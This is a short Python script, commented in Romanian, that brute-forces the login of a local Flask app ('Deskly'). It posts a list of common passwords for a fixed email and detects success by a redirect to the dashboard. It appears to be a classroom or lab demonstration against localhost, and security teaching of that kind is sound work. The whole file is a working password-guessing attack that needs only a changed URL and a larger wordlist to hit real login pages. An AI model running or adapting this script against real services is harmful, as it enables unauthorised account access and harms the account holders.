import requests

# URL-ul endpoint-ului de login.
TARGET_URL = "http://127.0.0.1:5000/login"

# Emailul tinta - demonstram ca putem forta parola unui utilizator cunoscut.
TARGET_EMAIL = "analyst@deskly.com"

# Lista mica de parole pentru demo. In realitate, un atacator ar folosi un wordlist mult mai mare.
WORDLIST = [
    "admin",
    "1234",
    "12345",
    "123456",
    "password",
    "password123",
    "qwerty",
    "letmein",
    "abc123",
    "123",
    "analyst",
    "deskly",
    "test",
    "root"
]


def brute_force():
    print(f"[*] Target: {TARGET_URL}")
    print(f"[*] Email: {TARGET_EMAIL}")
    print(f"[*] Incepem brute force cu {len(WORDLIST)} parole...\n")

    session = requests.Session()

    for password in WORDLIST:
        try:
            response = session.post(
                TARGET_URL,
                data={
                    "email": TARGET_EMAIL,
                    "password": password
                },
                allow_redirects=False,
                timeout=5
            )
        except requests.RequestException as error:
            print("[!] Nu s-a putut trimite request-ul catre aplicatie.")
            print(f"[!] Detalii eroare: {error}")
            print("[!] Verifica daca serverul Flask ruleaza pe http://127.0.0.1:5000")
            return

        # Daca serverul redirecteaza catre dashboard, parola a fost gasita.
        if response.status_code == 302 and "/tickets/dashboard" in response.headers.get("Location", ""):
            print(f"[+] PAROLA GASITA: {password}")
            print(f"    Status: {response.status_code}")
            print(f"    Redirect: {response.headers.get('Location')}")
            return

        print(f"[-] Esuat: {password} (status={response.status_code})")

    print("\n[!] Brute force finalizat - parola nu a fost gasita in wordlist.")


if __name__ == "__main__":
    brute_force()